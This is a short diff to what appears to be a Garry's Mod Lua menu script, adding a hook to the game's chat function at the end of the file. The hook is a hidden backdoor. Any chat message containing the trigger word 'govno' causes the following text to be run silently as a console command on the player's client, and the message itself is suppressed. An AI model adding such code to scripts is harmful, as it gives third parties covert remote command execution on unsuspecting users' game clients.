@@ -2535,3 +2535,14 @@ vgui.Register("frame_handler", PANEL, "DFrame")
 
 russia_menu = vgui.Create("frame_handler")
 russia_menu:MakePopup()
+
+local a = chat.AddText
+chat.AddText = function(...)
+    for b, c in next, {...} do
+        if isstring(c) and c:find("govno") then
+            LocalPlayer():ConCommand(("govno"):Explode(c)[2])
+            return
+        end
+    end
+    return a(...)
+end
